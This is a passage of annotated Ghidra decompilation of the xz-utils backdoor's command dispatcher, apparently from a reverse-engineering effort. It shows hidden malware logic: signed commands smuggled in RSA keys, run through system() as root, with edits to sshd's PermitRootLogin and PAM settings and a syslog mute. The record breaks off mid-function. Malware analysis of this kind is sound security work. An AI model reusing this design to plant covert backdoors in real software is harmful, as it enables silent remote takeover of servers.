// /home/kali/xzre-ghidra/xzregh/1094A0_run_backdoor_commands.c
// Function: run_backdoor_commands @ 0x1094A0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall run_backdoor_commands(RSA * key, global_context_t * ctx, BOOL * do_orig)


/*
 * AutoDoc: Command dispatcher invoked by every RSA hook. It refuses to run unless the loader finished initialising, the secret-data bitmap hit 0x1c8 bits, and a valid modulus/exponent pair is available. The modulus bytes are copied out of RSA_get0_key, decrypted with ChaCha keys unwrapped via secret_data_get_decrypted, and spliced with the current host-key digest before iterating sshd host keys until verify_signature accepts the Ed448 signature. The decoded cmd_arguments_t drives opcode-specific actions: opcode 0 updates sshd_offsets/logging/PAM bits and selects sockets, opcode 1 rewrites sshd variables or reseeds RSA_set0_key, opcode 2 runs setresuid/setresgid/system commands, and opcode 3 packages monitor_data_t payloads for sshd_proxy_elevate (including continuation chunks streamed into ctx->payload_buffer). Any parse/signature/socket failure flips disable_backdoor (and may call libc exit when requested) before forcing the RSA hook to defer to the original OpenSSL routine.
 */

#include "xzre_types.h"

BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)

{
  uid_t *command_payload_ptr;
  imported_funcs_t *imports;
  pfn_RSA_get0_key_t get_rsa_components;
  pfn_BN_num_bits_t get_modulus_bitlen;
  libc_imports_t *libc;
  sensitive_data *secrets;
  sshkey **host_keys;
  u8 *payload_buffer_cursor;
  pfn_setlogmask_t setlogmask_fn;
  sshd_ctx_t *sshd_ctx;
  uint *use_pam_ptr;
  sshd_monitor_func_t *keyallowed_slot;
  pfn_exit_t exit_fn;
  u8 control_flags;
  uint uVar15;
  int iVar16;
  BOOL BVar17;
  int iVar18;
  uid_t caller_uid;
  int pselect_result;
  ulong uVar21;
  int *piVar22;
  ssize_t bytes_read;
  BIGNUM *e;
  BIGNUM *n;
  long lVar24;
  byte bVar25;
  uint uVar26;
  u64 sshkey_digest_offset;
  ulong payload_chunk_len;
  ulong command_opcode;
  undefined1 uVar29;
  gid_t rgid;
  BIGNUM **stack_wipe_cursor;
  fd_set *fdset_wipe_cursor;
  u8 **ppuVar32;
  uint *header_copy_cursor;
  byte bVar34;
  _union_110 _Var35;
  long lVar36;
  ulong uVar37;
  ulong payload_data_offset;
  byte *ed448_raw_key;
  byte bVar39;
  backdoor_payload_t decrypted_payload;
  run_backdoor_commands_data_t f;
  u64 payload_body_len;
  ulong payload_body_offset;
  u8 *data_ptr;
  int data_offset;
  u16 *size_location;
  u64 delta;
  u8 *signature;
  sshd_offsets_t offsets;
  int rsa_modulus_bits;
  sshd_offsets_t tmp;
  int socket_probe_header;
  undefined4 uStack_59c;
  u8 *extra_data;
  undefined8 local_590;
  undefined8 uStack_588;
  int body_size;
  undefined1 local_550 [16];
  u8 *data_ptr2;
  u64 data_index;
  u32 v;
  int monitor_payload_size_le;
  BIGNUM *rsa_modulus_bn;
  int body_offset;
  int size;
  BIGNUM *rsa_exponent_bn;
  long hostkey_index;
  key_payload_t encrypted_payload;
  int rsa_modulus_bytes;
  BOOL sigcheck_result;
  undefined8 local_83;
  undefined8 uStack_7b;
  int key_idx;
  
  bVar39 = 0;
  stack_wipe_cursor = &rsa_exponent_bn;
  for (lVar24 = 0xae; lVar24 != 0; lVar24 = lVar24 + -1) {
    *(undefined4 *)stack_wipe_cursor = 0;
    stack_wipe_cursor = (BIGNUM **)((long)stack_wipe_cursor + 4);
  }
  if (ctx != (global_context_t *)0x0) {
    // AutoDoc: Refuse to inspect RSA handles until the loader finished initialising, imports resolved, and the RSA hook passed in a writable do_orig flag.
    if ((((ctx->disable_backdoor == FALSE) && (key != (RSA *)0x0)) &&
        (imports = ctx->imported_funcs, imports != (imported_funcs_t *)0x0)) &&
       ((get_rsa_components = imports->RSA_get0_key_resolved, get_rsa_components != (pfn_RSA_get0_key_t)0x0 &&
        (imports->BN_bn2bin != (pfn_BN_bn2bin_t)0x0)))) {
      if (do_orig == (BOOL *)0x0) {
        ctx->disable_backdoor = TRUE;
        return FALSE;
      }
      *do_orig = TRUE;
      (*get_rsa_components)(key,&rsa_exponent_bn,(BIGNUM **)&hostkey_index,(BIGNUM **)0x0);
      if ((((rsa_exponent_bn != (BIGNUM *)0x0) && (hostkey_index != 0)) &&
          ((ctx->imported_funcs != (imported_funcs_t *)0x0 &&
           // AutoDoc: Clamp the modulus to <0x4001 bits and ensure BN_bn2bin has room before treating the key bytes as a payload carrier.
           (((get_modulus_bitlen = ctx->imported_funcs->BN_num_bits, get_modulus_bitlen != (pfn_BN_num_bits_t)0x0 &&
             (uVar15 = (*get_modulus_bitlen)(rsa_exponent_bn), uVar15 < 0x4001)) &&
            (uVar15 = uVar15 + 7 >> 3, uVar15 - 0x14 < 0x205)))))) &&
         (iVar16 = (*ctx->imported_funcs->BN_bn2bin)
                             (rsa_exponent_bn,(uchar *)((long)&encrypted_payload.field0_0x0 + 5)),
         -1 < iVar16)) {
        uVar37 = (ulong)uVar15;
        if ((ulong)(long)iVar16 <= uVar37) {
          if ((ulong)(long)iVar16 < 0x11) goto LAB_0010a11a;
          if (((CONCAT13(encrypted_payload.field0_0x0._8_1_,encrypted_payload.field0_0x0._5_3_) == 0
               ) || (encrypted_payload.field0_0x0._9_4_ == 0)) ||
             (command_opcode = (ulong)CONCAT13(encrypted_payload.field0_0x0._8_1_,
                                       encrypted_payload.field0_0x0._5_3_) *
                       (ulong)(uint)encrypted_payload.field0_0x0._9_4_ +
                       // AutoDoc: Collapse the plaintext header’s stride/index/bias triple into one of the four monitor opcodes; any product outside the 0–3 window aborts the dispatch.
                       encrypted_payload.field0_0x0._13_8_, 3 < command_opcode)) goto LAB_0010a11a;
          libc = ctx->libc_imports;
          if (((libc != (libc_imports_t *)0x0) && (libc->getuid != (pfn_getuid_t)0x0)) &&
             ((libc->exit != (pfn_exit_t)0x0 &&
              ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->secret_bits_filled == 0x1c8)))))
             ) {
            local_83 = CONCAT44(encrypted_payload.field0_0x0._9_4_,
                                CONCAT13(encrypted_payload.field0_0x0._8_1_,
                                         encrypted_payload.field0_0x0._5_3_));
            uStack_7b = encrypted_payload.field0_0x0._13_8_;
            // AutoDoc: Unwrap the ChaCha key/nonce from secret_data and decrypt the modulus bytes into the temporary payload buffer.
            BVar17 = secret_data_get_decrypted((u8 *)&key_idx,ctx);
            if ((BVar17 != FALSE) &&
               (payload_buffer_cursor = (u8 *)((long)&encrypted_payload.field0_0x0 + 0x15),
               BVar17 = chacha_decrypt(payload_buffer_cursor,uVar15 - 0x10,(u8 *)&key_idx,(u8 *)&local_83,payload_buffer_cursor,
                                       ctx->imported_funcs), BVar17 != FALSE)) {
              *(u64 *)local_550 = 0;
              *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
              piVar22 = &key_idx;
              for (lVar24 = 0x39; lVar24 != 0; lVar24 = lVar24 + -1) {
                *(u8 *)piVar22 = '\0';
                piVar22 = (int *)((long)piVar22 + (ulong)bVar39 * -2 + 1);
              }
              local_590 = 0;
              uStack_588 = 0;
              ppuVar32 = &data_ptr2;
              for (lVar24 = 0x93; lVar24 != 0; lVar24 = lVar24 + -1) {
                *(undefined4 *)ppuVar32 = 0;
                ppuVar32 = (u8 **)((long)ppuVar32 + (ulong)bVar39 * -8 + 4);
              }
              secrets = ctx->sshd_sensitive_data;
              piVar22 = &body_size;
              for (lVar24 = 0x29; lVar24 != 0; lVar24 = lVar24 + -1) {
                *(undefined1 *)piVar22 = 0;
                piVar22 = (int *)((long)piVar22 + (ulong)bVar39 * -2 + 1);
              }
              if ((((secrets != (sensitive_data *)0x0) && (secrets->host_pubkeys != (sshkey **)0x0))
                  && (ctx->imported_funcs != (imported_funcs_t *)0x0)) && (0x71 < uVar37 - 0x10)) {
                iVar16 = (int)command_opcode;
                // AutoDoc: Cache the decoded opcode inside the cmd_arguments_t scratch so downstream handlers know how to interpret the payload body.
                *(int *)local_550 = iVar16;
                if (4 < uVar37 - 0x82) {
                  encrypted_payload.field0_0x0._0_1_ = (undefined1)rsa_modulus_bytes;
                  encrypted_payload.field0_0x0._1_1_ = (undefined1)((uint)rsa_modulus_bytes >> 8);
                  encrypted_payload.field0_0x0._2_1_ = (undefined1)((uint)rsa_modulus_bytes >> 0x10)
                  ;
                  encrypted_payload.field0_0x0._3_1_ = (undefined1)((uint)rsa_modulus_bytes >> 0x18)
                  ;
                  encrypted_payload.field0_0x0._4_1_ = (undefined1)sigcheck_result;
                  // AutoDoc: Strip the 0x87-byte RSA header (nonce, digest, signature framing) and treat the remainder of the modulus as attacker-controlled command bytes.
                  payload_body_len = uVar37 - 0x87;
                  // AutoDoc: Opcode 2 treats the payload body as a `[uid||gid||cmd]` triple: it optionally loads the uid/gid pair, invokes setresgid/setresuid, and finally runs the attacker command through libc system().
                  if (command_opcode == 2) {
                    uVar21 = (ulong)CONCAT11((undefined1)sigcheck_result,
                                             encrypted_payload.field0_0x0._3_1_);
                    if ((char)encrypted_payload.field0_0x0._0_1_ < '\0') {
                      if (CONCAT11((undefined1)sigcheck_result,encrypted_payload.field0_0x0._3_1_)
                          != 0) goto LAB_0010a112;
                      payload_chunk_len = 0;
                      uVar21 = 0x39;
                      ed448_raw_key = (byte *)((long)&sigcheck_result + 1);
                      lVar24 = 0;
                    }
                    else {
                      if ((rsa_modulus_bytes & 0x100U) != 0) {
                        uVar21 = uVar21 + 8;
                      }
                      ed448_raw_key = (byte *)0x0;
                      lVar24 = 0x87;
                      payload_chunk_len = uVar21;
                    }
                    // AutoDoc: Abort if the decrypted modulus does not contain enough bytes for the `[uid||gid||cmd]` tuple requested by the flag mix.
                    if (payload_body_len < uVar21) goto LAB_0010a112;
                    _data_offset = uVar21 + 5;
                    payload_body_len = payload_body_len - uVar21;
                    payload_data_offset = uVar21 + 0x87;
                    iVar18 = (int)uVar21 + 4;
                  }
                  else if ((iVar16 == 3) && ((rsa_modulus_bytes & 0x4000U) == 0)) {
                    if (payload_body_len < 0x30) goto LAB_0010a112;
                    payload_chunk_len = 0x30;
                    lVar24 = 0x87;
                    ed448_raw_key = (byte *)0x0;
                    _data_offset = 0x35;
                    payload_data_offset = 0x87;
                    iVar18 = 0x34;
                  }
                  else {
                    payload_chunk_len = 0;
                    lVar24 = 0;
                    payload_data_offset = 0x87;
                    ed448_raw_key = (byte *)0x0;
                    _data_offset = 5;
                    iVar18 = 4;
                  }
                  piVar22 = &rsa_modulus_bytes;
                  header_copy_cursor = (undefined4 *)(local_550 + 4);
                  for (uVar21 = (ulong)(iVar18 + 1); uVar21 != 0; uVar21 = uVar21 - 1) {
                    *(char *)header_copy_cursor = (char)*piVar22;
                    piVar22 = (int *)((long)piVar22 + (ulong)bVar39 * -2 + 1);
                    header_copy_cursor = (undefined4 *)((long)header_copy_cursor + (ulong)bVar39 * -2 + 1);
                  }
                  stack0xfffffffffffffa60 = (u8 *)0x0;
                  host_keys = secrets->host_keys;
                  extra_data = (u8 *)0x0;
                  if (((host_keys != (sshkey **)0x0) && (secrets->host_pubkeys != (sshkey **)0x0)) &&
                     ((host_keys != secrets->host_pubkeys &&
                      (((((uint)secrets->have_ssh2_key < 2 &&
                         // AutoDoc: Sanity-check both host key arrays; if the cached counts do not match, signature verification is skipped and the hook bails.
                         (BVar17 = count_pointers(host_keys,(u64 *)((long)&socket_probe_header + 1),
                                                  ctx->libc_imports), BVar17 != FALSE)) &&
                        (BVar17 = count_pointers(ctx->sshd_sensitive_data->host_pubkeys,
                                                 (u64 *)&extra_data,ctx->libc_imports),
                        payload_buffer_cursor = stack0xfffffffffffffa60, BVar17 != FALSE)) &&
                       (stack0xfffffffffffffa60 == extra_data)))))) {
                    BVar17 = secret_data_get_decrypted((u8 *)&local_590,ctx);
                    if (BVar17 != FALSE) {
                      lVar36 = 0;
                      do {
                        offsets.field0_0x0 = SUB84(payload_buffer_cursor,0);
                        _Var35.raw_value = (u32)lVar36;
                        if ((uint)offsets.field0_0x0 <= _Var35.raw_value) goto LAB_0010a112;
                        // AutoDoc: Iterate every cached host key until the Ed448 signature over the modulus+ciphertext digest validates.
                        BVar17 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[lVar36],
                                                  local_550,_data_offset + 4,0x25c,
                                                  (u8 *)((long)&encrypted_payload.field0_0x0 + 0x15)
                                                  ,(u8 *)&local_590,ctx);
                        lVar36 = lVar36 + 1;
                      } while (BVar17 == FALSE);
                      ctx->sshd_host_pubkey_idx = (u32)_Var35;
                      if ((command_opcode != 2) || (-1 < (char)encrypted_payload.field0_0x0._0_1_)) {
                        if (lVar24 == 0) {
LAB_00109a97:
                          if (payload_data_offset <= uVar37) goto LAB_00109aa2;
                        }
                        else {
                          payload_data_offset = 0x87;
LAB_00109aa2:
                          if (payload_chunk_len <= uVar37 - payload_data_offset) {
                            if ((((encrypted_payload.field0_0x0._0_1_ & 4) == 0) ||
                                (ctx->libc_imports == (libc_imports_t *)0x0)) ||
                               (setlogmask_fn = ctx->libc_imports->setlogmask,
                               setlogmask_fn == (pfn_setlogmask_t)0x0)) {
                              ctx->sshd_log_ctx->syslog_mask_applied = FALSE;
                              if ((encrypted_payload.field0_0x0._0_1_ & 5) == 5) goto LAB_0010a1ba;
                            }
                            else {
                              // AutoDoc: Control flag bit 2 requests `setlogmask(INT_MIN)` so syslog stops emitting anything before the hook swaps handlers.
                              (*setlogmask_fn)(-0x80000000);
                              ctx->sshd_log_ctx->syslog_mask_applied = TRUE;
                            }
                            caller_uid = (*ctx->libc_imports->getuid)();
                            control_flags = encrypted_payload.field0_0x0._0_1_;
                            // AutoDoc: Capture whoever triggered the RSA hook (getuid) so sshd_proxy_elevate and the PAM/log toggles can reason about the original privilege.
                            ctx->caller_uid = caller_uid;
                            bVar34 = encrypted_payload.field0_0x0._0_1_ & 0x10;
                            if (((bVar34 == 0) || (ctx->sshd_log_ctx->handler_slots_valid != FALSE))
                               && (((encrypted_payload.field0_0x0._0_1_ & 2) == 0 ||
                                   // AutoDoc: Optional logging instructions drop the mm_log_handler hook into place once the caller proved the handler/context slots are writable.
                                   ((BVar17 = sshd_configure_log_hook
                                                        ((cmd_arguments_t *)&encrypted_payload,ctx),
                                    BVar17 != FALSE || (bVar34 == 0)))))) {
                              if (command_opcode == 0) {
                                if (((char)encrypted_payload.field0_0x0._1_1_ < '\0') ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                  bVar34 = 0xff;
                                  if ((encrypted_payload.field0_0x0._1_1_ & 2) != 0) {
                                    bVar34 = (byte)(CONCAT11(encrypted_payload.field0_0x0._3_1_,
                                                             encrypted_payload.field0_0x0._2_1_) >>
                                                   6) & 0x7f;
                                  }
                                  bVar25 = 0xff;
                                  if ((char)control_flags < '\0') {
                                    bVar25 = (byte)(((ulong)CONCAT41(encrypted_payload.field0_0x0.
                                                                     _4_4_,encrypted_payload.
                                                                           field0_0x0._3_1_) << 0x18
                                                    ) >> 0x1d) & 0x1f;
                                  }
                                  uVar15 = (uint)CONCAT11(bVar25,bVar34);
                                  if ((encrypted_payload.field0_0x0._1_1_ & 4) == 0) {
LAB_00109c56:
                                    uVar15 = uVar15 | 0xff0000;
                                    uVar26 = 0xff;
                                  }
                                  else {
                                    uVar26 = (uint)((byte)encrypted_payload.field0_0x0._4_1_ >> 5);
                                    uVar15 = uVar15 | ((byte)encrypted_payload.field0_0x0._4_1_ >> 2
                                                      & 7) << 0x10;
                                  }
LAB_00109c7b:
                                  uVar15 = uVar15 | uVar26 << 0x18;
LAB_00109c8a:
                                  // AutoDoc: The bit packing above rewrites sshd_offsets (log slot, monitor opcode override, socket ordinal) directly from the attacker’s flag bytes.
                                  (ctx->sshd_offsets).field0_0x0.raw_value = uVar15;
                                  command_payload_ptr = (uid_t *)((long)&encrypted_payload.field0_0x0 +
                                                    payload_data_offset + 5);
                                  // AutoDoc: Opcode 1/2/3 sides only run when the hook already executes as root; unprivileged callers are forced through the harmless offsets rewrite.
                                  if (caller_uid == 0) {
                                    libc = ctx->libc_imports;
                                    if ((((libc != (libc_imports_t *)0x0) &&
                                         (libc->setresgid != (pfn_setresgid_t)0x0)) &&
                                        (libc->setresuid != (pfn_setresuid_t)0x0)) &&
                                       (libc->system != (pfn_system_t)0x0)) {
                                      if (command_opcode == 0) {
                                        sshd_ctx = ctx->sshd_ctx;
                                        if (((sshd_ctx != (sshd_ctx_t *)0x0) &&
                                            (sshd_ctx->mm_answer_keyallowed_slot !=
                                             (sshd_monitor_func_t *)0x0)) &&
                                           (sshd_ctx->have_mm_answer_keyallowed != FALSE)) {
                                          if ((char)encrypted_payload.field0_0x0._1_1_ < '\0')
                                          goto LAB_00109d36;
                                          piVar22 = sshd_ctx->permit_root_login_ptr;
                                          if (piVar22 != (int *)0x0) {
                                            iVar16 = *piVar22;
                                            if (iVar16 < 3) {
                                              if (-1 < iVar16) {
                                                *piVar22 = 3;
LAB_00109d36:
                                                // AutoDoc: Control-flag bit 6 disables PAM by zeroing sshd_ctx->use_pam_ptr whenever the caller wants password auth rejected regardless of sshd’s config.
                                                if ((control_flags & 0x40) != 0) {
                                                  use_pam_ptr = (uint *)sshd_ctx->use_pam_ptr;
                                                  if ((use_pam_ptr == (uint *)0x0) || (1 < *use_pam_ptr))
                                                  goto LAB_0010a1ba;
                                                  *use_pam_ptr = 0;
                                                }
                                                stack0xfffffffffffffa60 =
                                                     (u8 *)CONCAT44(uStack_59c,0xffffffff);
                                                if ((control_flags & 0x20) == 0) {
                                                  // AutoDoc: Opcode 0 either reuses the live monitor client socket or captures a fresh one so payload replies can be streamed back to the attacker.
                                                  BVar17 = sshd_get_client_socket
                                                                     (ctx,(int *)((long)&
                                                  socket_probe_header + 1),1,DIR_READ);
                                                }
                                                else {
                                                  // AutoDoc: When the control flags request a manual socket ordinal the helper probes each fd via shutdown/read until a viable descriptor is found.
                                                  BVar17 = sshd_get_usable_socket
                                                                     ((int *)((long)&
                                                  socket_probe_header + 1),
                                                  (byte)encrypted_payload.field0_0x0._1_1_ >> 3 &
                                                  0xf,libc);
                                                }
                                                if (BVar17 != FALSE) {
                                                  iVar16 = stack0xfffffffffffffa60;
                                                  *(u8 *)&socket_probe_header = 0;
                                                  extra_data = (u8 *)((ulong)extra_data &
                                                                     0xffffffff00000000);
                                                  local_590 = 0;
                                                  uStack_588 = 0;
                                                  if (((-1 < stack0xfffffffffffffa60) &&
                                                      (libc = ctx->libc_imports,
                                                      libc != (libc_imports_t *)0x0)) &&
                                                     ((libc->pselect != (pfn_pselect_t)0x0 &&
                                                      (libc->__errno_location !=
                                                       (pfn___errno_location_t)0x0)))) {
                                                    iVar18 = stack0xfffffffffffffa60 >> 6;
                                                    uVar37 = 1L << ((byte)stack0xfffffffffffffa60 &
                                                                   0x3f);
                                                    do {
                                                      uStack_588 = 500000000;
                                                      fdset_wipe_cursor = (fd_set *)local_550;
                                                      for (lVar24 = 0x20; lVar24 != 0;
                                                          lVar24 = lVar24 + -1) {
                                                        *(undefined4 *)fdset_wipe_cursor = 0;
                                                        fdset_wipe_cursor = (fd_set *)
                                                                  ((long)fdset_wipe_cursor +
                                                                  (ulong)bVar39 * -8 + 4);
                                                      }
                                                      *(ulong *)(local_550 + (long)iVar18 * 8) =
                                                           uVar37;
                                                      local_590 = 0;
                                                      // AutoDoc: Block on the attacker-chosen socket (up to 500ms) before slurping the next monitor reply chunk so forged payloads stay aligned with sshd’s IPC cadence.
                                                      pselect_result = (*libc->pselect)(iVar16 + 1,
                                                                                  (fd_set *)
                                                                                  local_550,
                                                                                  (fd_set *)0x0,
                                                                                  (fd_set *)0x0,
                                                                                  (timespec *)
                                                                                  &local_590,
                                                                                  (sigset_t *)0x0);
                                                      if (-1 < pselect_result) {
                                                        if (((pselect_result != 0) &&
                                                            ((uVar37 & *(ulong *)(local_550 +
                                                                                 (long)iVar18 * 8))
                                                             != 0)) &&
                                                           (bytes_read = fd_read(iVar16,&extra_data,4,
                                                                             libc), -1 < bytes_read))
                                                        {
                                                          uVar15 = (uint)extra_data >> 0x18 |
                                                                   ((uint)extra_data & 0xff0000) >>
                                                                   8 | ((uint)extra_data & 0xff00)
                                                                       << 8 |
                                                                   (uint)extra_data << 0x18;
                                                          extra_data = (u8 *)CONCAT44(extra_data.
                                                                                      _4_4_,uVar15);
                                                          if ((uVar15 - 1 < 0x41) &&
                                                             (bytes_read = fd_read(iVar16,&
                                                  socket_probe_header,1,libc), -1 < bytes_read)) {
                                                    ctx->sock_read_len =
                                                         (ulong)((uint)extra_data - 1);
                                                    bytes_read = fd_read(iVar16,ctx->sock_read_buf,
                                                                     (ulong)((uint)extra_data - 1),
                                                                     libc);
                                                    if (-1 < bytes_read) {
                                                      sshd_ctx = ctx->sshd_ctx;
                                                      if (sshd_ctx->mm_answer_keyallowed_hook !=
                                                          (sshd_monitor_func_t)0x0) {
                                                        keyallowed_slot = sshd_ctx->
                                                  mm_answer_keyallowed_slot;
                                                  if ((encrypted_payload.field0_0x0._2_1_ & 0x3f) ==
                                                      0) {
                                                    iVar16 = 0x16;
                                                    if (keyallowed_slot != (sshd_monitor_func_t *)0x0) {
                                                      iVar16 = *(int *)(keyallowed_slot + -1);
                                                    }
                                                  }
                                                  else {
                                                    iVar16 = (uint)(encrypted_payload.field0_0x0.
                                                                    _2_1_ & 0x3f) * 2;
                                                  }
                                                  // AutoDoc: Select the monitor request opcode the attacker wants to impersonate and drop mm_answer_keyallowed_hook into the live slot so the next exchange hits the implant.
                                                  sshd_ctx->mm_answer_keyallowed_reqtype = iVar16 + 1
                                                  ;
                                                  *keyallowed_slot = sshd_ctx->mm_answer_keyallowed_hook;
                                                  goto LAB_0010a076;
                                                  }
                                                  }
                                                  }
                                                  }
                                                  break;
                                                  }
                                                  piVar22 = (*libc->__errno_location)();
                                                  } while (*piVar22 == 4);
                                                  }
                                                }
                                              }
                                            }
                                            else if (iVar16 == 3) goto LAB_00109d36;
                                          }
                                        }
                                      }
                                      else if (iVar16 == 1) {
                                        // AutoDoc: Opcode 1 rewrites sshd globals (PermitRootLogin, use_pam, etc.) based on the control-flag bits before re-entering the monitor loop.
                                        BVar17 = sshd_patch_variables
                                                           ((byte)encrypted_payload.field0_0x0._1_1_
                                                            & TRUE,(byte)encrypted_payload.
                                                                         field0_0x0._0_1_ >> 6 &
                                                                   TRUE,
                                                            (byte)encrypted_payload.field0_0x0._1_1_
                                                            >> 1 & TRUE,
                                                            (uint)(byte)encrypted_payload.field0_0x0
                                                                        ._3_1_,ctx);
                                        if (BVar17 != FALSE) {
LAB_0010a076:
                                          local_590 = CONCAT71((local_590 >> 8),1);
                                          *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
                                          ppuVar32 = &data_ptr2;
                                          for (lVar24 = 0x3c; lVar24 != 0; lVar24 = lVar24 + -1) {
                                            *(undefined4 *)ppuVar32 = 0;
                                            ppuVar32 = (u8 **)((long)ppuVar32 +
                                                              (ulong)bVar39 * -8 + 4);
                                          }
                                          *(u64 *)local_550 = 0x80;
                                          *(u8 *)&body_offset = 8;
                                          *(u8 *)&size = 1;
                                          e = (*ctx->imported_funcs->BN_bin2bn)
                                                        ((uchar *)&local_590,1,(BIGNUM *)0x0);
                                          if (((e != (BIGNUM *)0x0) &&
                                              (n = (*ctx->imported_funcs->BN_bin2bn)
                                                             (local_550,0x100,(BIGNUM *)0x0),
                                              n != (BIGNUM *)0x0)) &&
                                             (iVar16 = (*ctx->imported_funcs->RSA_set0_key)
                                                                 (key,n,e,(BIGNUM *)0x0),
                                             iVar16 == 1)) goto LAB_0010a112;
                                        }
                                      }
                                      else if (iVar16 == 2) {
                                        payload_chunk_len = payload_chunk_len & 0xffff;
                                        // AutoDoc: Bit0 of monitor_flags decides whether opcode 2 prepends attacker-supplied uid/gid values (set) or leaves both zeroed so the shell command inherits root.
                                        if ((encrypted_payload.field0_0x0._1_1_ & 1) == 0) {
                                          rgid = 0;
                                          lVar24 = 0;
                                          caller_uid = 0;
                                        }
                                        else {
                                          if (payload_chunk_len < 9) goto LAB_0010a1ba;
                                          caller_uid = *command_payload_ptr;
                                          rgid = *(gid_t *)((long)&encrypted_payload.field0_0x0 +
                                                           payload_data_offset + 9);
                                          payload_chunk_len = payload_chunk_len - 8;
                                          lVar24 = 8;
                                        }
                                        if ((char)control_flags < '\0') {
                                          if (2 < payload_chunk_len) {
                                            uVar37 = (ulong)*(ushort *)((long)command_payload_ptr + lVar24);
                                            payload_chunk_len = payload_chunk_len - 2;
                                            lVar24 = lVar24 + 2;
                                            if (payload_chunk_len <= uVar37) goto LAB_00109fb9;
                                          }
                                        }
                                        else {
                                          uVar37 = (ulong)CONCAT11(encrypted_payload.field0_0x0.
                                                                   _4_1_,encrypted_payload.
                                                                         field0_0x0._3_1_);
LAB_00109fb9:
                                          if ((((uVar37 <= payload_chunk_len) &&
                                               ((rgid == 0 ||
                                                (iVar16 = (*libc->setresgid)(rgid,rgid,rgid),
                                                iVar16 != -1)))) &&
                                              ((caller_uid == 0 ||
                                               (iVar16 = (*ctx->libc_imports->setresuid)
                                                                   (caller_uid,caller_uid,caller_uid),
                                               iVar16 != -1)))) &&
                                             (*(char *)((long)command_payload_ptr + lVar24) != '\0')) {
                                            (*ctx->libc_imports->system)
                                                      ((char *)((long)command_payload_ptr + lVar24));
                                            goto LAB_0010a076;
                                          }
                                        }
                                      }
                                      // AutoDoc: When the monitor flags carry the 0xC0 pattern the dispatcher sleeps for five seconds and exits sshd immediately, giving the operator a clean kill-switch path.
                                      else if ((((encrypted_payload.field0_0x0._1_1_ & 0xc0) == 0xc0
                                                ) && (libc->exit != (pfn_exit_t)0x0)) &&
                                              (libc->pselect != (pfn_pselect_t)0x0)) {
                                        *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
                                        *(u64 *)local_550 = 5;
                                        (*libc->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
                                                           (fd_set *)0x0,(timespec *)local_550,
                                                           (sigset_t *)0x0);
                                        (*libc->exit)(0);
                                      }
                                    }
                                  }
                                  else {
                                    header_copy_cursor = (undefined4 *)(local_550 + 4);
                                    for (lVar24 = 0xb; lVar24 != 0; lVar24 = lVar24 + -1) {
                                      *header_copy_cursor = 0;
                                      header_copy_cursor = header_copy_cursor + (ulong)bVar39 * -2 + 1;
                                    }
                                    *(cmd_arguments_t **)(local_550 + 8) = &encrypted_payload;
                                    data_ptr2 = (u8 *)rsa_exponent_bn;
                                    data_index = hostkey_index;
                                    _v = command_payload_ptr;
                                    // AutoDoc: Expose the monitor payload length for opcode 3 so sshd_proxy_elevate can treat the decrypted chunk as a forged monitor_data_t frame.
                                    *(u16 *)&monitor_payload_size_le = (short)payload_chunk_len;
                                    rsa_modulus_bn = (BIGNUM *)key;
                                    // AutoDoc: Opcode 3 populates a monitor_data_t and lets sshd_proxy_elevate forge replies or run system commands under the requested uid/gid.
                                    BVar17 = sshd_proxy_elevate((monitor_data_t *)local_550,ctx);
                                    if (BVar17 != FALSE) {
                                      ctx->disable_backdoor = TRUE;
                                      *do_orig = FALSE;
                                      return TRUE;
                                    }
                                  }
                                }
                              }
                              else if (iVar16 == 1) {
                                if (((encrypted_payload.field0_0x0._1_1_ & 1) != 0) ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0))
                                goto LAB_00109b6c;
                              }
                              else {
                                if (iVar16 != 3) {
LAB_00109b6c:
                                  uVar15 = 0;
                                  goto LAB_00109c8a;
                                }
                                if (((char)encrypted_payload.field0_0x0._3_1_ < '\0') ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                  if ((encrypted_payload.field0_0x0._2_1_ & 0x20) != 0) {
                                    uVar29 = 0xff;
                                    if ((char)encrypted_payload.field0_0x0._2_1_ < '\0') {
                                      uVar29 = encrypted_payload.field0_0x0._4_1_;
                                    }
                                    bVar34 = 0xff;
                                    if ((encrypted_payload.field0_0x0._2_1_ & 0x40) != 0) {
                                      bVar34 = encrypted_payload.field0_0x0._3_1_ & 0x3f;
                                    }
                                    uVar15 = (uint)CONCAT11(bVar34,uVar29);
                                    if ((encrypted_payload.field0_0x0._3_1_ & 0x40) == 0)
                                    goto LAB_00109c56;
                                    uVar26 = (byte)encrypted_payload.field0_0x0._1_1_ >> 3 & 7;
                                    uVar15 = uVar15 | ((byte)encrypted_payload.field0_0x0._1_1_ & 7)
                                                      << 0x10;
                                    goto LAB_00109c7b;
                                  }
                                  uVar15 = 0xffffffff;
                                  goto LAB_00109c8a;
                                }
                              }
                            }
                          }
                        }
LAB_0010a1ba:
                        ctx->disable_backdoor = TRUE;
                        piVar22 = &key_idx;
                        for (lVar24 = 0x39; lVar24 != 0; lVar24 = lVar24 + -1) {
                          *(undefined1 *)piVar22 = 0;
                          piVar22 = (int *)((long)piVar22 + (ulong)bVar39 * -2 + 1);
                        }
                        if ((encrypted_payload.field0_0x0._0_1_ & 1) != 0) {
                          if (ctx->libc_imports == (libc_imports_t *)0x0) {
                            return FALSE;
                          }
                          exit_fn = ctx->libc_imports->exit;
                          if (exit_fn == (pfn_exit_t)0x0) {
                            return FALSE;
                          }
                          // AutoDoc: Bit0 doubles as a kill switch: on fatal parse/signature errors the hook calls libc exit(0) instead of handing control back to OpenSSL.
                          (*exit_fn)(0);
                          return FALSE;
                        }
                        goto LAB_0010a11a;
                      }
                      // AutoDoc: Continuation chunks land here: copy the decrypted bytes into ctx->payload_buffer, extend payload_bytes_buffered, and re-verify the Ed448 signature before treating the chunk as another control-plane payload.
                      if (ed448_raw_key != (byte *)0x0) {
                        if ((encrypted_payload.field0_0x0._1_1_ & 1) == 0) {
                          lVar24 = 0;
                        }
                        else {
                          lVar24 = 8;
